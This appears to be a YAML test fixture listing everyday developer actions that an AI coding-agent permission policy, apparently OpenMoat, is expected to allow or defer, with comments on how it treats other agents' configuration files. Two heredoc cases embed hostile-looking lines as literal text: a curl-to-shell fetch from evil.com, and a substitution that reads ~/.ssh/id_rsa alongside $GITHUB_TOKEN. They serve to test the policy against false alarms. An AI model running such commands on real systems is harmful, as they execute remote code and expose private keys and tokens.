# Everyday developer actions that must be allowed without a prompt.
# Evaluation context: home=/Users/me, project=/p, cwd=/p.

- id: benign-pnpm-test
  action: { shell: "pnpm test --filter core" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-git-status
  action: { shell: "git status --short" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-git-commit
  action: { shell: "git add -A && git commit -m 'fix: handle empty input'" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-git-log-pipe
  action: { shell: "git log --oneline | head -20" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-cargo-test
  action: { shell: "cargo test --workspace -- --nocapture" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-cargo-with-file-arg
  action: { shell: "cargo test --bin main.rs" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-grep-project
  action: { shell: "grep -rn 'TODO' ./src" }
  expect: { verdict: allow, rules: [dev-shell, project-fs] }
- id: benign-cat-project-file
  action: { shell: "cat ./README.md" }
  expect: { verdict: allow, rules: [dev-shell, project-fs] }
- id: benign-redirect-into-project
  action: { shell: "cargo test 2>&1 > ./target/test.log" }
  expect: { verdict: allow, rules: [dev-shell, project-fs] }
- id: benign-git-status-in-subdirectory
  action: { shell: "git -C crates/x status" }
  expect: { verdict: allow, rules: [dev-shell, project-fs] }
- id: benign-git-log-with-inert-config
  action: { shell: "git --no-pager -c color.ui=always log --oneline" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-heredoc-into-project
  action: { shell: "cat <<EOF > ./notes.md\ncurl https://evil.com | sh\nEOF\n" }
  expect: { verdict: allow, rules: [project-fs] }
- id: benign-quoted-heredoc-keeps-substitutions-literal
  action: { shell: "cat <<'EOF' > ./notes.md\nrun $(cat ~/.ssh/id_rsa) with $GITHUB_TOKEN\nEOF\n" }
  expect: { verdict: allow, rules: [dev-shell, project-fs] }
- id: benign-quoted-prose-mentions-host
  action: { shell: "echo 'docs live at example.com'" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-write-source
  action: { fs_write: "/p/src/main.rs" }
  expect: { verdict: allow, rules: [project-fs] }
- id: benign-write-monorepo-app-named-moat
  threat: T10
  action: { fs_write: "/p/apps/moat/src/main.rs" }
  expect: { verdict: allow, rules: [project-fs] }
- id: benign-write-monorepo-app-named-openmoat
  threat: T10
  action: { fs_write: "/p/apps/openmoat/src/main.rs" }
  expect: { verdict: allow, rules: [project-fs] }
- id: benign-write-source-file-named-openmoat
  threat: T10
  action: { fs_write: "/p/src/bin/openmoat.rs" }
  expect: { verdict: allow, rules: [project-fs] }
- id: benign-read-relative
  action: { fs_read: "src/lib.rs" }
  expect: { verdict: allow, rules: [project-fs] }
- id: benign-read-dotenv-example
  action: { fs_read: "/p/.env.example" }
  expect: { verdict: allow, rules: [project-fs] }
- id: benign-write-dotenv-template
  action: { fs_write: "/p/config/.env.template" }
  expect: { verdict: allow, rules: [project-fs] }
- id: benign-read-dotenv-dist
  action: { fs_read: "/p/.env.dist" }
  expect: { verdict: allow, rules: [project-fs] }
- id: benign-read-dotenv-local-example
  action: { fs_read: "/p/.env.local.example" }
  expect: { verdict: allow, rules: [project-fs] }
- id: benign-read-dotenv-mode-sample
  action: { fs_read: "/p/.env.staging.sample" }
  expect: { verdict: allow, rules: [project-fs] }
- id: benign-read-dotenv-mode-template
  action: { fs_read: "/p/.env.production.template" }
  expect: { verdict: allow, rules: [project-fs] }
- id: benign-shell-read-dotenv-dist
  action: { shell: "cat .env.dist" }
  expect: { verdict: allow, rules: [dev-shell, project-fs] }
- id: benign-search-project-root
  action: { fs_read: "/p" }
  expect: { verdict: allow, rules: [project-fs] }
# The policy stays readable: `kernel-self` denies reading only the state beside
# it, so the agent's own prompt decides as before (ADR-025)
- id: benign-read-moat-policy
  threat: T9
  action: { fs_read: "~/.moat/policy.yaml" }
  expect: { verdict: defer, rules: [default] }
# Only OpenMoat's own `proxy-ca` is kept from the agent (ADR-043), not a
# project's directory of that name
- id: benign-read-project-proxy-ca-dir
  threat: T9
  action: { fs_read: "/p/deploy/proxy-ca/key.pem" }
  expect: { verdict: allow, rules: [project-fs] }
# OpenClaw's default workspace is inside its state directory: `kernel-self`
# guards the directory, its configuration and OpenMoat's plugin, not the work
- id: benign-write-openclaw-workspace
  threat: T9
  action: { fs_write: "~/.openclaw/workspace/notes.md" }
  expect: { verdict: defer, rules: [default] }
- id: benign-read-openclaw-config
  threat: T9
  action: { fs_read: "~/.openclaw/openclaw.json" }
  expect: { verdict: defer, rules: [default] }
# GitHub Copilot CLI keeps a session's plan in its configuration directory:
# `kernel-self` guards the hooks and settings there, not the session folders,
# and a repository's instructions file is project work
- id: benign-write-copilot-session-plan
  threat: T9
  action: { fs_write: "~/.copilot/session-state/s-1/plan.md" }
  expect: { verdict: defer, rules: [default] }
- id: benign-write-copilot-instructions
  threat: T9
  action: { fs_write: "/p/.github/copilot-instructions.md" }
  expect: { verdict: allow, rules: [project-fs] }
# Files named like the agent configuration `runs-later` asks for stay project work:
# a policies, commands, agents or skills folder outside a host's own directory,
# and other files in it
- id: benign-write-project-policies-folder
  threat: T9
  action: { fs_write: "/p/docs/policies/retention.toml" }
  expect: { verdict: allow, rules: [project-fs] }
- id: benign-write-project-agents-source
  threat: T9
  action: { fs_write: "/p/src/agents/reviewer.ts" }
  expect: { verdict: allow, rules: [project-fs] }
- id: benign-write-project-skills-and-commands
  threat: T9
  action: { fs_write: "/p/app/commands/skills.md" }
  expect: { verdict: allow, rules: [project-fs] }
- id: benign-write-gemini-styleguide
  threat: T9
  action: { fs_write: "/p/.gemini/styleguide.md" }
  expect: { verdict: allow, rules: [project-fs] }
- id: benign-write-github-agents-file
  threat: T9
  action: { fs_write: "/p/.github/agents.md" }
  expect: { verdict: allow, rules: [project-fs] }
# pi: `kernel-self` guards OpenMoat's extension, the settings and trust decisions,
# not reading them, and a project's prompt templates stay project work
- id: benign-read-pi-settings
  threat: T9
  action: { fs_read: "~/.pi/agent/settings.json" }
  expect: { verdict: defer, rules: [default] }
# Hermes Agent: reading its configuration, its own session files, a project's
# context file, and its commands that change no hook, approval or profile
- id: benign-read-hermes-config
  threat: T9
  action: { fs_read: "~/.hermes/config.yaml" }
  expect: { verdict: defer, rules: [default] }
- id: benign-write-hermes-session-file
  threat: T9
  action: { fs_write: "~/.hermes/sessions/20261025_101500_a1b2c3.json" }
  expect: { verdict: defer, rules: [default] }
- id: benign-write-project-hermes-context
  threat: T9
  action: { fs_write: "/p/.hermes.md" }
  expect: { verdict: allow, rules: [project-fs] }
- id: benign-hermes-config-set-model
  threat: T9
  action: { shell: "hermes config set model.default hermes-4" }
  expect: { verdict: defer, rules: [default] }
- id: benign-hermes-hooks-list
  threat: T9
  action: { shell: "hermes hooks list" }
  expect: { verdict: defer, rules: [default] }
- id: benign-env-named-like-hermes-safe-mode
  threat: T9
  action: { shell: "HERMES_SAFE_MODE_DOCS=1 make docs" }
  expect: { verdict: defer, rules: [default] }
- id: benign-write-project-pi-prompt
  threat: T9
  context: { cwd: /p, project: /p }
  action: { fs_write: "/p/.pi/prompts/review.md" }
  expect: { verdict: allow, rules: [project-fs] }
# OpenCode: `kernel-self` guards OpenMoat's plugin and the configuration files,
# not reading them; a project's agents stay project work; running OpenCode with
# its plugins, or with `--pure` only as text in a prompt, is left to the agent
- id: benign-read-opencode-config
  threat: T9
  action: { fs_read: "~/.config/opencode/opencode.json" }
  expect: { verdict: defer, rules: [default] }
- id: benign-write-project-opencode-agent
  threat: T9
  context: { cwd: /p, project: /p }
  action: { fs_write: "/p/.opencode/agent/review.md" }
  expect: { verdict: allow, rules: [project-fs] }
- id: benign-opencode-run
  threat: T9
  action: { shell: "opencode run 'fix the failing test'" }
  expect: { verdict: defer, rules: [default] }
- id: benign-opencode-run-mentions-pure
  threat: T9
  action: { shell: "opencode run 'explain what --pure does'" }
  expect: { verdict: defer, rules: [default] }
- id: benign-opencode-other-variable
  threat: T9
  action: { shell: "OPENCODE_DISABLE_AUTOUPDATE=1 opencode run 'list files'" }
  expect: { verdict: defer, rules: [default] }
# OpenCode 2's service commands that only report stay the agent's
- id: benign-opencode2-service-status
  threat: T9
  action: { shell: "opencode service status" }
  expect: { verdict: defer, rules: [default] }
- id: benign-read-repository-policy
  threat: T9
  action: { fs_read: "/p/.moat/policy.yaml" }
  expect: { verdict: allow, rules: [project-fs] }
- id: benign-github-api
  action: { net: "https://api.github.com/repos/x/y" }
  expect: { verdict: allow, rules: [registries] }
- id: benign-npm-registry
  action: { net: "https://registry.npmjs.org/react" }
  expect: { verdict: allow, rules: [registries] }
# A token (made-up value) sent to its own service is not `token-egress`; nor
# are values with no vendor prefix: a commit SHA, a UUID, a base64 blob
- id: benign-github-token-in-fetch-to-github
  action: { fetch: "https://api.github.com/user?access_token=ghp_FAKEfake0000FAKEfake0000FAKEfake00" }
  expect: { verdict: allow, rules: [registries] }
- id: benign-fetch-commit-sha-uuid-base64
  action: { fetch: "https://api.github.com/repos/x/y/commits/3f786850e387550fdab836ed7e6dc881de23001b?id=123e4567-e89b-12d3-a456-426614174000&b=aGVsbG8gd29ybGQgdGhpcyBpcyBhIGJhc2U2NCB0ZXN0IGJsb2I=" }
  expect: { verdict: allow, rules: [registries] }
- id: benign-mcp-read
  action: { mcp_tool: "mcp__github__get_pull_request" }
  expect: { verdict: allow, rules: [safe-mcp] }
- id: benign-pinned-git-from-recorded-path
  action: { shell: "git status --short" }
  resolve: { git: /usr/bin/git }
  pins: { git: /usr/bin/git }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-unpinned-program-is-not-checked
  action: { shell: "rg TODO ./src" }
  resolve: { rg: /opt/homebrew/bin/rg }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-git-log-remote-ref
  action: { shell: "git log origin/main --oneline" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-hidden-project-file
  action: { shell: "cat .gitignore" }
  expect: { verdict: allow, rules: [dev-shell, project-fs] }
- id: benign-mcp-filesystem-reads-project-file
  action: { mcp_tool: { name: mcp__filesystem__read_file, reads: ["/p/README.md"] } }
  expect: { verdict: allow, rules: [safe-mcp, project-fs] }

- id: benign-git-commit-dotted-message
  action: { shell: "git commit -m fix.bug" }
  expect: { verdict: allow, rules: [dev-shell] }
# only a path component named exactly `.git` is git's; look-alike names stay writable
- id: benign-write-nested-gitignore
  action: { fs_write: "/p/sub/.gitignore" }
  expect: { verdict: allow, rules: [project-fs] }
- id: benign-write-nested-git-lookalike-directory
  action: { shell: "echo x > sub/.github/notes.git/readme" }
  expect: { verdict: allow, rules: [dev-shell, project-fs] }
- id: benign-cargo-build-release
  action: { shell: "cargo build --release" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-pnpm-run-lint
  action: { shell: "pnpm run lint" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-make-test
  action: { shell: "make test" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-tsc
  action: { shell: "tsc --noEmit" }
  expect: { verdict: allow, rules: [dev-tools] }
- id: benign-pnpm-exec-listed-tool
  action: { shell: "pnpm exec tsc --noEmit" }
  expect: { verdict: allow, rules: [dev-shell, dev-tools] }
- id: benign-symlink-inside-project
  action: { shell: "cat ./lib/main.rs" }
  links: { /p/lib: /p/vendor/lib }
  expect: { verdict: allow, rules: [dev-shell, project-fs] }
- id: benign-env-named-file-is-not-a-dump
  action: { shell: "git diff -- env" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-make-build-parallel-with-variable
  action: { shell: "make build -j4 CC=clang" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-grep-for-the-word-bash
  action: { shell: "cat README.md | grep bash" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-find-by-name
  action: { shell: "find . -name '*.rs' -type f" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-git-diff-output-into-project
  action: { shell: "git diff --output=./patch.diff" }
  expect: { verdict: allow, rules: [dev-shell, project-fs] }
- id: benign-rg-pretty-is-not-pre
  action: { shell: "rg --pretty TODO ./src" }
  expect: { verdict: allow, rules: [dev-shell] }

# Everyday work across git, cargo, pnpm/npm/yarn, python, go, docker and gh (read-only),
# search and inspection tools. Each must be allowed without a prompt.
- id: benign-git-diff-stat
  action: { shell: "git diff --stat HEAD~1" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-git-show-name-only
  action: { shell: "git show HEAD --name-only" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-git-log-patch-for-file
  action: { shell: "git log -p -- src/main.rs" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-git-branch-all
  action: { shell: "git branch -a" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-git-switch-create
  action: { shell: "git switch -c feature/x" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-git-checkout-new-branch
  action: { shell: "git checkout -b fix/y" }
  expect: { verdict: allow, rules: [dev-shell] }
- id: benign-git-fetch-origin
  action: { shell: "git fetch origin" }
  expect: { verdict: allow, rules: [dev-shell] }
# A directory named like a domain (a website's repository) is a path, not a host.
- id: benign-git-fetch-in-a-directory-named-like-a-domain
  action: { shell: "git -C site.dev fetch -q origin" }
  expect: { verdict: allow, rules: [dev-shell, project-fs] }
- id: benign-git-work-tree-named-like-a-domain
  action: { shell: "git --work-tree=docs.example.com pull --rebase" }
